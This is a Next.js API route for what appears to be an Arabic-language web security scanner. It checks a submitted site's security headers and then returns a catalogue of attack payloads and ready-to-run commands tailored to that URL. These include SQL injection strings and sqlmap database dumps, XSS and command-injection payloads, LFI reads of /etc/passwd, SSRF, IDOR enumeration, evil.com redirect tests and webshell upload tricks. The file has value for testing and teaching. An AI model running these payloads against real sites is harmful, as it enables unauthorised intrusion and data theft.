import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  try {
    const { url } = await request.json()
    
    if (!url) {
      return NextResponse.json({ error: 'URL is required' }, { status: 400 })
    }

    // Validate URL
    let parsedUrl: URL
    try {
      parsedUrl = new URL(url)
    } catch {
      return NextResponse.json({ error: 'Invalid URL format' }, { status: 400 })
    }

    const results: any = {
      url: parsedUrl.href,
      domain: parsedUrl.hostname,
      protocol: parsedUrl.protocol,
      findings: [],
      headers: {},
      technologies: [],
    }

    // Fetch the URL and analyze headers
    try {
      const response = await fetch(parsedUrl.href, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        },
        redirect: 'follow',
        signal: AbortSignal.timeout(10000),
      })

      // Capture headers
      const headers: Record<string, string> = {}
      response.headers.forEach((value, key) => {
        headers[key] = value
      })
      results.headers = headers
      results.statusCode = response.status

      // Check for security headers
      const securityHeaders = {
        'content-security-policy': { name: 'Content-Security-Policy', secure: true, impact: 'منع XSS وحقن المحتوى' },
        'x-frame-options': { name: 'X-Frame-Options', secure: true, impact: 'منع Clickjacking' },
        'x-content-type-options': { name: 'X-Content-Type-Options', secure: true, impact: 'منع MIME sniffing' },
        'strict-transport-security': { name: 'Strict-Transport-Security', secure: true, impact: 'إجبار HTTPS' },
        'x-xss-protection': { name: 'X-XSS-Protection', secure: true, impact: 'حماية XSS قديمة' },
        'referrer-policy': { name: 'Referrer-Policy', secure: true, impact: 'حماية الخصوصية' },
        'permissions-policy': { name: 'Permissions-Policy', secure: true, impact: 'تحكم في الميزات' },
      }

      // Check missing security headers
      const missingHeaders: string[] = []
      for (const [header, info] of Object.entries(securityHeaders)) {
        if (!headers[header]) {
          missingHeaders.push(info.name)
          results.findings.push({
            type: 'missing-header',
            severity: 'medium',
            title: `رأس أمان مفقود: ${info.name}`,
            description: `رأس ${info.name} غير موجود. هذا يعرّض الموقع لـ ${info.impact}`,
            impact: info.impact,
          })
        }
      }

      // Check for information disclosure in headers
      if (headers['server']) {
        results.findings.push({
          type: 'info-disclosure',
          severity: 'low',
          title: 'كشف معلومات الخادم',
          description: `رأس Server يكشف معلومات: ${headers['server']}`,
          payload: `Server: ${headers['server']}`,
        })
      }

      if (headers['x-powered-by']) {
        results.findings.push({
          type: 'info-disclosure',
          severity: 'low',
          title: 'كشف تقنية الاستخدام',
          description: `رأس X-Powered-By يكشف: ${headers['x-powered-by']}`,
          payload: `X-Powered-By: ${headers['x-powered-by']}`,
        })
      }

      // Detect technologies
      const techIndicators = {
        'php': headers['x-powered-by']?.includes('PHP'),
        'asp.net': headers['x-powered-by']?.includes('ASP.NET'),
        'express': headers['x-powered-by']?.includes('Express'),
        'nextjs': headers['x-powered-by']?.includes('Next.js'),
        'laravel': headers['set-cookie']?.includes('laravel_session'),
        'django': headers['set-cookie']?.includes('csrftoken'),
        'rails': headers['set-cookie']?.includes('_session_id'),
        'wordpress': headers['link']?.includes('wp-json'),
      }

      for (const [tech, detected] of Object.entries(techIndicators)) {
        if (detected) {
          results.technologies.push(tech)
        }
      }

      // Add vulnerability checks based on URL structure and technology
      const allVulns = [
        {
          id: 'sql-injection',
          title: 'SQL Injection',
          titleAr: 'حقن SQL',
          icon: '💉',
          severity: 'critical',
          description: 'ثغرة تسمح بحقن أكواد SQL ضارة في استعلامات قاعدة البيانات',
          payloads: ["' OR '1'='1", "' OR '1'='1' --", "1 UNION SELECT NULL--"],
          commands: [`sqlmap -u "${parsedUrl.href}?id=1" --dbs`, `sqlmap -u "${parsedUrl.href}?id=1" -D database --tables`],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح SQL Injection بالعربي',
          checkUrl: `${parsedUrl.href}?id=1'`,
        },
        {
          id: 'xss',
          title: 'XSS',
          titleAr: 'حقن النصوص',
          icon: '📜',
          severity: 'high',
          description: 'ثغرة تسمح بحقن سكريبتات ضارة في صفحات الويب',
          payloads: ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>"],
          commands: [`XSStrike -u "${parsedUrl.href}"`, `dalfox url "${parsedUrl.href}?q=test"`],
          videoId: 'q0bzXY32xiI',
          videoTitle: 'شرح XSS كامل',
          checkUrl: `${parsedUrl.href}?q=<script>alert('XSS')</script>`,
        },
        {
          id: 'csrf',
          title: 'CSRF',
          titleAr: 'تزوير الطلبات',
          icon: '🎣',
          severity: 'high',
          description: 'ثغرة تسمح بتنفيذ عمليات غير مرغوبة عبر طلبات مزيفة',
          payloads: [`<form action="${parsedUrl.href}" method="POST"><input name="email" value="evil@hack.com"></form>`],
          commands: ['Burp Suite -> Repeater -> Modify request'],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح CSRF بالعربي',
        },
        {
          id: 'ssrf',
          title: 'SSRF',
          titleAr: 'تزوير الطلبات من الخادم',
          icon: '🖥️',
          severity: 'high',
          description: 'ثغرة تسمح بتجهيز طلبات من الخادم إلى موارد داخلية',
          payloads: ["http://127.0.0.1:8080", "http://localhost:22", "file:///etc/passwd"],
          commands: [`curl -v "${parsedUrl.href}?url=http://127.0.0.1"`, 'Burp Collaborator'],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح SSRF',
        },
        {
          id: 'command-injection',
          title: 'Command Injection',
          titleAr: 'حقن الأوامر',
          icon: '⌨️',
          severity: 'critical',
          description: 'ثغرة تسمح بتنفيذ أوامر نظام التشغيل على الخادم',
          payloads: ["; ls -la", "| cat /etc/passwd", "`whoami`", "$(id)"],
          commands: [`curl "${parsedUrl.href}?cmd=;+id"`, 'Use Burp to inject in parameters'],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح Command Injection',
        },
        {
          id: 'lfi',
          title: 'LFI',
          titleAr: 'تضمين الملفات المحلية',
          icon: '📁',
          severity: 'high',
          description: 'ثغرة تسمح بقراءة ملفات محلية من الخادم',
          payloads: ["../../../../etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
          commands: [`curl "${parsedUrl.href}?page=../../../../etc/passwd"`, 'Burp -> Intruder with LFI wordlist'],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح LFI',
        },
        {
          id: 'idor',
          title: 'IDOR',
          titleAr: 'التحكم بالمعرف',
          icon: '🔗',
          severity: 'high',
          description: 'ثغرة تسمح بالوصول لبيانات مستخدمين آخرين بتغيير المعرّف',
          payloads: ['/api/user/1 -> /api/user/2', '/profile?id=100 -> /profile?id=101'],
          commands: [`curl "${parsedUrl.href}/api/user/1"`, 'For i in $(seq 1 100); do curl "' + parsedUrl.href + '/api/user/$i"; done'],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح IDOR',
        },
        {
          id: 'open-redirect',
          title: 'Open Redirect',
          titleAr: 'إعادة التوجيه المفتوحة',
          icon: '↗️',
          severity: 'medium',
          description: 'ثغرة تسمح بإعادة توجيه المستخدمين لمواقع ضارة',
          payloads: ['/redirect?url=https://evil.com', '/login?next=https://evil.com'],
          commands: [`curl -v "${parsedUrl.href}/redirect?url=https://evil.com"`],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح Open Redirect',
        },
        {
          id: 'jwt',
          title: 'JWT Attacks',
          titleAr: 'هجمات JWT',
          icon: '🔐',
          severity: 'high',
          description: 'ثغرات في توقيعات JWT تسمح بتزوير الهوية',
          payloads: ['{"alg":"none"}', 'Change alg HS256 to RS256'],
          commands: ['jwt_tool TARGET_TOKEN -T', 'hashcat -m 16500 jwt.txt wordlist.txt'],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح JWT Security',
        },
        {
          id: 'cors',
          title: 'CORS Misconfiguration',
          titleAr: 'خطأ في إعدادات CORS',
          icon: '🌐',
          severity: 'medium',
          description: 'خطأ في تكوين سياسات مشاركة الموارد عبر النطاقات',
          payloads: ['Origin: https://evil.com', 'Origin: null'],
          commands: [`curl -H "Origin: https://evil.com" -v ${parsedUrl.href}`],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح CORS',
        },
        {
          id: 'file-upload',
          title: 'File Upload',
          titleAr: 'ثغرات رفع الملفات',
          icon: '📤',
          severity: 'high',
          description: 'ثغرة تسمح برفع ملفات ضارة مثل Webshells',
          payloads: ['shell.php.jpg', 'shell.php%00.jpg', 'shell.phtml'],
          commands: ['Upload webshell and access via browser', 'Use Burp to modify upload request'],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح File Upload',
        },
        {
          id: 'subdomain-takeover',
          title: 'Subdomain Takeover',
          titleAr: 'استحواذ النطاق الفرعي',
          icon: '🌍',
          severity: 'high',
          description: 'استحواذ على نطاق فرعي غير مستخدم يشير لخدمة خارجية',
          payloads: ['Check CNAME record points to expired service'],
          commands: [`subjack -w subdomains.txt -t 100`, `dig ${parsedUrl.hostname} ANY`],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح Subdomain Takeover',
        },
      ]

      results.findings.push(...allVulns)

    } catch (fetchError) {
      // If we can't fetch the URL, still provide vulnerability suggestions
      results.error = 'Could not fetch URL directly'
      results.findings = [
        {
          id: 'sql-injection',
          title: 'SQL Injection',
          titleAr: 'حقن SQL',
          icon: '💉',
          severity: 'critical',
          description: 'ثغرة تسمح بحقن أكواد SQL ضارة في استعلامات قاعدة البيانات',
          payloads: ["' OR '1'='1", "' OR '1'='1' --", "1 UNION SELECT NULL--"],
          commands: [`sqlmap -u "${parsedUrl.href}?id=1" --dbs`],
          videoId: 'ISV8U8fheXw',
          videoTitle: 'شرح SQL Injection بالعربي',
        },
        {
          id: 'xss',
          title: 'XSS',
          titleAr: 'حقن النصوص',
          icon: '📜',
          severity: 'high',
          description: 'ثغرة تسمح بحقن سكريبتات ضارة في صفحات الويب',
          payloads: ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
          commands: [`XSStrike -u "${parsedUrl.href}"`],
          videoId: 'q0bzXY32xiI',
          videoTitle: 'شرح XSS كامل',
        },
      ]
    }

    return NextResponse.json(results)

  } catch (error) {
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 })
  }
}
